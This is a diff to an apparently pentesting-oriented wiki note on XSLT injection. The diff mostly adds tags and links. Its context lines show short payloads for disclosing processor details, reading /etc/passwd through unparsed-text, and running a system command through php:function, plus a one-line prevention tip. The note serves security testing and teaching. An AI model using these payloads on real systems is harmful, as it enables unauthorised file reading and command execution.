@@ -1,7 +1,8 @@
 ## eXtensible Stylesheet Language Transformation (XSLT)
 
+#xml
 
-Examples:
+**Examples**:
 ```xslt
 <?xml version="1.0"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
@@ -15,7 +16,7 @@ Examples:
 ```
 
 #### Info disclosure
-
+[[Information disclosure]]
 ```xml
 Version: <xsl:value-of select="system-property('xsl:version')" />
 <br/>
@@ -29,6 +30,7 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
 ```
 
 #### LFI
+[[LFI]]
 XSLT 2.0
 ```xml
 <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
@@ -39,11 +41,11 @@ XSLT 2.0
 ```
 
 ##### RCE
+[[RCE]]
 ```xml
 <xsl:value-of select="php:function('system','id')" />
 ```
 
 
 #### Prevention
-
 Escape <, > and other symbols
